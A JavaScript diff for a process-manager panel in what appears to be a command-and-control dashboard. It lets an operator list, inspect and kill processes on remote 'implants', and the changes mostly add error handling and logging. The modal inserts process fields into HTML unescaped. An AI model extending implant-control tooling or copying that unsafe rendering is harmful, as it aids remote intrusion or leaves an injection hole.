@@ -7,27 +7,49 @@ const ProcessManager = {
 
     init(socket) {
         this.socket = socket;
+        console.log('ProcessManager initialized with socket');
         this.setupEventListeners();
     },
 
     setupEventListeners() {
-        // Refresh button
-        document.getElementById('refresh-processes').addEventListener('click', () => this.refreshProcesses());
+        try {
+            // Refresh button
+            const refreshBtn = document.getElementById('refresh-processes');
+            if (refreshBtn) {
+                refreshBtn.addEventListener('click', () => this.refreshProcesses());
+            }
 
-        // Search input
-        document.getElementById('process-search').addEventListener('input', (e) => {
-            this.searchTerm = e.target.value.toLowerCase();
-            this.filterProcesses();
-        });
+            // Search input
+            const searchInput = document.getElementById('process-search');
+            if (searchInput) {
+                searchInput.addEventListener('input', (e) => {
+                    this.searchTerm = e.target.value.toLowerCase();
+                    this.filterProcesses();
+                });
+            }
 
-        // Socket event listeners
-        this.socket.on('process_list', this.handleProcessList.bind(this));
-        this.socket.on('process_killed', this.handleProcessKilled.bind(this));
+            // Use custom event for WebSocket messages
+            document.addEventListener('socket-message', (event) => {
+                const message = event.detail;
+                if (message.type === 'process_list') {
+                    this.handleProcessList(message);
+                } else if (message.type === 'process_killed') {
+                    this.handleProcessKilled(message);
+                } else if (message.type === 'process_info') {
+                    this.showProcessDetailsModal(message.process_info);
+                }
+            });
+            
+            console.log('ProcessManager event listeners set up');
+        } catch (error) {
+            console.error('Error setting up ProcessManager event listeners:', error);
+        }
     },
 
     selectImplant(implantId) {
+        console.log(`ProcessManager: Setting selected implant to ${implantId}`);
         this.selectedImplant = implantId;
-        this.refreshProcesses();
+        return implantId;
     },
 
     refreshProcesses() {
@@ -36,12 +58,23 @@ const ProcessManager = {
             return;
         }
 
-        this.socket.emit('get_processes', {
-            implant_id: this.selectedImplant
-        });
+        if (WebSocketManager && WebSocketManager.send) {
+            WebSocketManager.send({
+                type: 'get_processes',
+                implant_id: this.selectedImplant
+            });
+            console.log(`Requested processes for implant: ${this.selectedImplant}`);
+        } else {
+            console.error('WebSocketManager not available');
+        }
     },
 
     handleProcessList(data) {
+        if (!data.processes) {
+            console.error('No process data received');
+            return;
+        }
+        
         this.processList = data.processes;
         this.filterProcesses();
     },
@@ -60,6 +93,11 @@ const ProcessManager = {
 
     renderProcessList(processes) {
         const processList = document.getElementById('process-list');
+        if (!processList) {
+            console.error('Process list element not found');
+            return;
+        }
+        
         processList.innerHTML = '';
 
         processes.forEach(process => {
@@ -88,20 +126,26 @@ const ProcessManager = {
     viewProcessDetails(pid) {
         if (!this.selectedImplant) return;
 
-        this.socket.emit('get_process_details', {
-            implant_id: this.selectedImplant,
-            pid: pid
-        });
+        if (WebSocketManager && WebSocketManager.send) {
+            WebSocketManager.send({
+                type: 'get_process_details',
+                implant_id: this.selectedImplant,
+                pid: pid
+            });
+        }
     },
 
     killProcess(pid) {
         if (!this.selectedImplant) return;
 
         if (confirm(`Are you sure you want to kill process ${pid}?`)) {
-            this.socket.emit('kill_process', {
-                implant_id: this.selectedImplant,
-                pid: pid
-            });
+            if (WebSocketManager && WebSocketManager.send) {
+                WebSocketManager.send({
+                    type: 'kill_process',
+                    implant_id: this.selectedImplant,
+                    pid: pid
+                });
+            }
         }
     },
 
@@ -116,101 +160,99 @@ const ProcessManager = {
 
     // Process details modal
     showProcessDetailsModal(details) {
-        const modal = document.createElement('div');
-        modal.className = 'modal fade';
-        modal.id = 'processDetailsModal';
-        modal.innerHTML = `
-            <div class="modal-dialog modal-lg">
-                <div class="modal-content">
-                    <div class="modal-header">
-                        <h5 class="modal-title">Process Details</h5>
-                        <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
-                    </div>
-                    <div class="modal-body">
-                        <div class="row">
-                            <div class="col-md-6">
-                                <h6>Basic Information</h6>
-                                <table class="table">
-                                    <tr>
-                                        <th>PID:</th>
-                                        <td>${details.pid}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Name:</th>
-                                        <td>${details.name}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>User:</th>
-                                        <td>${details.user}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Status:</th>
-                                        <td>${details.status}</td>
-                                    </tr>
-                                </table>
+        if (!details) {
+            console.error('No process details received');
+            return;
+        }
+        
+        try {
+            const modal = document.createElement('div');
+            modal.className = 'modal fade';
+            modal.id = 'processDetailsModal';
+            modal.innerHTML = `
+                <div class="modal-dialog modal-lg">
+                    <div class="modal-content">
+                        <div class="modal-header">
+                            <h5 class="modal-title">Process Details</h5>
+                            <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                        </div>
+                        <div class="modal-body">
+                            <div class="row">
+                                <div class="col-md-6">
+                                    <h6>Basic Information</h6>
+                                    <table class="table">
+                                        <tr>
+                                            <th>PID:</th>
+                                            <td>${details.pid}</td>
+                                        </tr>
+                                        <tr>
+                                            <th>Name:</th>
+                                            <td>${details.name}</td>
+                                        </tr>
+                                        <tr>
+                                            <th>User:</th>
+                                            <td>${details.user}</td>
+                                        </tr>
+                                        <tr>
+                                            <th>Status:</th>
+                                            <td>${details.status}</td>
+                                        </tr>
+                                    </table>
+                                </div>
+                                <div class="col-md-6">
+                                    <h6>Resource Usage</h6>
+                                    <table class="table">
+                                        <tr>
+                                            <th>CPU:</th>
+                                            <td>${details.cpu}%</td>
+                                        </tr>
+                                        <tr>
+                                            <th>Memory:</th>
+                                            <td>${dashboard.formatBytes(details.memory)}</td>
+                                        </tr>
+                                        <tr>
+                                            <th>Threads:</th>
+                                            <td>${details.threads}</td>
+                                        </tr>
+                                        <tr>
+                                            <th>Priority:</th>
+                                            <td>${details.priority}</td>
+                                        </tr>
+                                    </table>
+                                </div>
                             </div>
-                            <div class="col-md-6">
-                                <h6>Resource Usage</h6>
-                                <table class="table">
-                                    <tr>
-                                        <th>CPU:</th>
-                                        <td>${details.cpu}%</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Memory:</th>
-                                        <td>${dashboard.formatBytes(details.memory)}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Threads:</th>
-                                        <td>${details.threads}</td>
-                                    </tr>
-                                    <tr>
-                                        <th>Priority:</th>
-                                        <td>${details.priority}</td>
-                                    </tr>
-                                </table>
+                            <div class="row mt-3">
+                                <div class="col-12">
+                                    <h6>Command Line</h6>
+                                    <pre class="bg-light p-2">${details.command_line}</pre>
+                                </div>
                             </div>
                         </div>
-                        <div class="row mt-3">
-                            <div class="col-12">
-                                <h6>Command Line</h6>
-                                <pre class="bg-light p-2">${details.command_line}</pre>
-                            </div>
+                        <div class="modal-footer">
+                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+                            <button type="button" class="btn btn-danger" onclick="ProcessManager.killProcess('${details.pid}')">
+                                Kill Process
+                            </button>
                         </div>
-                    </div>
-                    <div class="modal-footer">
-                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
-                        <button type="button" class="btn btn-danger" onclick="ProcessManager.killProcess('${details.pid}')">
-                            Kill Process
-                        </button>
                     </div>
                 </div>
-            </div>
-        `;
+            `;
 
-        document.body.appendChild(modal);
-        const modalInstance = new bootstrap.Modal(modal);
-        modalInstance.show();
+            document.body.appendChild(modal);
+            const modalInstance = new bootstrap.Modal(modal);
+            modalInstance.show();
 
-        modal.addEventListener('hidden.bs.modal', () => {
-            modal.remove();
-        });
+            modal.addEventListener('hidden.bs.modal', () => {
+                modal.remove();
+            });
+        } catch (error) {
+            console.error('Error displaying process details:', error);
+        }
     }
 };
 
-// Initialize when document is ready
+// Remove the duplicate initialization since WebSocketManager now handles this
 document.addEventListener('DOMContentLoaded', () => {
-    // Initialize WebSocket connection
-    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-    const socket = new WebSocket(`${protocol}//${window.location.host}/ws/dashboard`);
-
-    // Handle WebSocket messages
-    socket.onmessage = (event) => {
-        const data = JSON.parse(event.data);
-        if (data.type === 'process_list') {
-            updateProcessList(data.processes);
-        }
-    };
-
-    ProcessManager.init(socket);
+    // WebSocketManager will initialize this module
+    console.log('ProcessManager waiting for WebSocketManager initialization');
 }); 
